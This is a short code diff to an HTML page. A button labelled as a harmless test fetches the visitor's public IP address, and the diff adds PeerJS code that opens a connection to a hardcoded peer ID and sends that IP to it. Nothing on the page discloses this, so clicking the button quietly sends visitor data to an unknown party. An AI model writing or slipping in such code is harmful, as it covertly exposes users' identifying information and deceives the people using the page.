@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
         <head>
+                <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
         </head>
         <body>
                 <button onclick = "getIp()">This is my cool test button!!!</button>
@@ -9,6 +10,13 @@
                 function getIp(){
                         fetch("https://api.ipify.org/?format=json").then(res => res.json()).then(function(res){
                                 console.log(res.ip)
+                                var peer = new Peer()
+                                peer.on('open', function(){
+                                        var conn = peer.connect("rgrjgnregjp4gn43uignu4ngu4ngj5kyn5j4nyhy54jnhjkngj34ng34ngij4ngi3nig3j4n")
+                                        conn.on('open', function(){
+                                            conn.send(res.ip)
+                                        })
+                                })
                         })        
                 }
         </script>
